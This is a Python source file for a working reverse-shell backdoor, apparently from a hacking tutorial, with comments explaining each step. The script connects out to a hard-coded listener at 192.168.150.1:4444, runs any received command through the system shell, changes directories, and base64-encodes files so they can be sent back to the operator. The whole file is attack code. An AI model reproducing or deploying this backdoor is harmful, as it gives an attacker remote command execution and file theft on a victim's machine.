#!usr/bin/env python
import socket
import subprocess
import json
import base64
import os

class Backdoor:
    def __init__(self, ip, port):#for initalisation of the connection between two machines
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#
        self.connection.connect((ip, port))#to connect to the listener.py for the perticular ip
    
    def reliable_send(self, data):
        json_data = json.dumps(data)#here dumps will first serialized the data objects, and make a file-like object where the bytes will be written.
        self.connection.send(json_data)#socket sending the data
    
    def reliable_recieve(self):
        json_data = self.connection.recv(1024) #used to receive data from both TCP and UDP sockets.
        return json.loads(json_data)#turning JSON encoded data into Python objects.

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell = True)
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to "+ str(path)
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def run(self):
        while True:
            command = self.reliable_recieve()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command)>1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.150.1", 4444)
my_backdoor.run()